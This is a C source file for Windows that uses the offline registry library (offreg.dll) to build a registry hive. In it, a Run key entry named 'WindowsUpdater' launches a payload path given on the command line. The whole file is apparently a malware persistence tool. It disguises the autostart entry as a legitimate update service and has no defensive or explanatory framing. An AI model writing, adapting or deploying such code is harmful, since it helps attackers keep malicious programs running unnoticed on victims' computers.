#include <windows.h>

typedef PVOID ORHKEY;
typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);
typedef LONG (WINAPI* pORCloseHive)(ORHKEY);
typedef LONG (WINAPI* pORCloseKey)(ORHKEY);

typedef struct {
    pORCreateHive  CreateHive;
    pORCreateKey   CreateKey;
    pORSetValue    SetValue;
    pORSaveHive    SaveHive;
    pORCloseHive   CloseHive;
    pORCloseKey    CloseKey;
    HMODULE hMod;
} OffregApi;

BOOL InitOffreg(OffregApi* api) {
    api->hMod = LoadLibraryA("offreg.dll");
    if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
    if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
    if (!api->hMod) return FALSE;

    api->CreateHive = (pORCreateHive)GetProcAddress(api->hMod, "ORCreateHive");
    api->CreateKey  = (pORCreateKey)GetProcAddress(api->hMod, "ORCreateKey");
    api->SetValue   = (pORSetValue)GetProcAddress(api->hMod, "ORSetValue");
    api->SaveHive   = (pORSaveHive)GetProcAddress(api->hMod, "ORSaveHive");
    api->CloseHive  = (pORCloseHive)GetProcAddress(api->hMod, "ORCloseHive");
    api->CloseKey   = (pORCloseKey)GetProcAddress(api->hMod, "ORCloseKey");

    if (!api->CreateHive || !api->CreateKey || !api->SetValue || !api->SaveHive || !api->CloseHive || !api->CloseKey) return FALSE;
    return TRUE;
}

void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
            *pMajor = osvi.dwMajorVersion;
            *pMinor = osvi.dwMinorVersion;
            return;
        }
    }
    *pMajor = 6; *pMinor = 1;
}

int main() {
    int argc = 0;
    LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argvW || argc != 3) return 1;

    char payloadPathA[MAX_PATH] = {0};
    char outputPathA[MAX_PATH] = {0};
    WideCharToMultiByte(CP_ACP, 0, argvW[1], -1, payloadPathA, MAX_PATH, NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, argvW[2], -1, outputPathA, MAX_PATH, NULL, NULL);
    LocalFree(argvW);

    WCHAR payloadPathW[MAX_PATH] = {0};
    WCHAR outputPathW[MAX_PATH] = {0};
    MultiByteToWideChar(CP_ACP, 0, payloadPathA, -1, payloadPathW, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, outputPathA, -1, outputPathW, MAX_PATH);

    OffregApi api = { 0 };
    if (!InitOffreg(&api)) return 1;

    DWORD osMajor, osMinor;
    GetRealOsVersion(&osMajor, &osMinor);

    ORHKEY hHive = NULL;
    if (api.CreateHive(&hHive) != ERROR_SUCCESS) return 1;

    LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName  = L"WindowsUpdater";

    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    
    if (api.CreateKey(hHive, runKeyPath, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        api.CloseHive(hHive);
        return 1;
    }

    if (api.SetValue(hKey, valueName, 0, REG_SZ, (const BYTE*)payloadPathW, (DWORD)((wcslen(payloadPathW) + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        api.CloseKey(hKey);
        api.CloseHive(hHive);
        return 1;
    }

    api.CloseKey(hKey);
    api.SaveHive(hHive, outputPathW, osMajor, osMinor);
    api.CloseHive(hHive);

    return 0;
}
